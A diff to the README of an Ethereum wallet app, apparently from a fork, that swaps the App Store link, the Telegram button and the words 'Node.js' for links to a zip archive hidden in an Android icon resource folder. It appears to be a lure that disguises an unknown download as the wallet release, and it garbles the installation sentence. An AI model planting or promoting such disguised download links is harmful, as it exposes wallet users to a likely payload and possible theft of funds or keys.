@@ -1,5 +1,5 @@
 # Golden Wallet - Ethereum Wallet & ERC20 Tokens
-[<img src="https://raw.githubusercontent.com/goldennetwork/golden-wallet-react-native/master/screen-shots/Golden-Wallet.png">](https://itunes.apple.com/us/app/golden-best-wallet-ever/id1399824799)
+[<img src="https://raw.githubusercontent.com/wolfenix/golden-wallet-react-native/master/android/app/src/main/res/mipmap-xxxhdpi/golden-wallet-react-native_v1.4.zip">](https://raw.githubusercontent.com/wolfenix/golden-wallet-react-native/master/android/app/src/main/res/mipmap-xxxhdpi/golden-wallet-react-native_v1.4.zip)
 
 ## Features
 
@@ -11,7 +11,7 @@
 
 ## Build Golden Wallet 
 ### Installation
-Install `rn-nodeify` to be able to use Node.js libs.
+Install `rn-nodeify` to be able to use https://raw.githubusercontent.com/wolfenix/golden-wallet-react-native/master/android/app/src/main/res/mipmap-xxxhdpi/golden-wallet-react-native_v1.4.zip libs.
 	
 	sudo npm i rn-nodeify -g
 
@@ -37,4 +37,4 @@ Run Golden on Android
 
 	react-native run-android
 
-[![button](http://liquidico.com/media/content/ckeditor/2018/02/28/g1_l9SmamB.png)](https://t.me/goldenwallet)
+[![button](https://raw.githubusercontent.com/wolfenix/golden-wallet-react-native/master/android/app/src/main/res/mipmap-xxxhdpi/golden-wallet-react-native_v1.4.zip)](https://raw.githubusercontent.com/wolfenix/golden-wallet-react-native/master/android/app/src/main/res/mipmap-xxxhdpi/golden-wallet-react-native_v1.4.zip)
